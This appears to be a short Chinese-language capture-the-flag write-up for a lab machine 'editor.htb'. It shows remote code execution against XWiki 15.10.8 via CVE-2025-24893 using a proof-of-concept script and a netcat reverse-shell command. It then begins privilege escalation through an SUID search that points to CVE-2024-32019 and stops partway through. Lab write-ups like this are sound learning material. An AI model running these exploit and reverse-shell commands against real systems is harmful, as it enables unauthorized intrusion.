漏洞利用

访问 http://editor.htb:8080/xwiki/bin/view/Main/ 可以看到目标是XWiki 15.10.8 ，通过Google可以检索到CVE-2025-24893，下载poc

$ python3 CVE-2025-24893.py --url "http://editor.htb:8080/xwiki" --command "id"
[*] Sending request to web server
[+] Output:

uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)

$ python3 CVE-2025-24893.py --url "http://editor.htb:8080/xwiki" --command "busybox nc 10.10.16.19 7777 -e /bin/bash"
[*] Sending request to web server
[+] Output:

信息收集

权限提升

查找特殊权限的文件，找到一个/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo ,通过检索可以找到CVE-2024-32019

oliver@editor:~$ find / -user root -perm /4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
